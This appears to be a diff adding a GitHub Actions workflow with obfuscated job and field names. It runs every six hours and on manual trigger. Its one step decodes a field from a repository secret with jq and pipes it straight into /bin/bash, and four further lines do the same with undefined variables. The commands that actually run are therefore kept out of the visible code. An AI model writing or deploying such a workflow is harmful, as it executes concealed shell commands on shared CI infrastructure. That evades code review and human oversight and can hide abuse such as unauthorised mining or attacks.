@@ -1,0 +1,21 @@
+name: xiaqimin3434
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaqimin3434
+        env:
+          p3: ${{ secrets.p3 }}
+        run: |
+          echo $p3 | jq -r .y40363 | /bin/bash
+          echo $v1763 | jq -r .itbij3 | /bin/bash
+          echo $jiaf30 | jq -r .rvbrm4 | /bin/bash
+          echo $lh06 | jq -r .aawwv785 | /bin/bash
+          echo $y88964 | jq -r .lf16 | /bin/bash
+
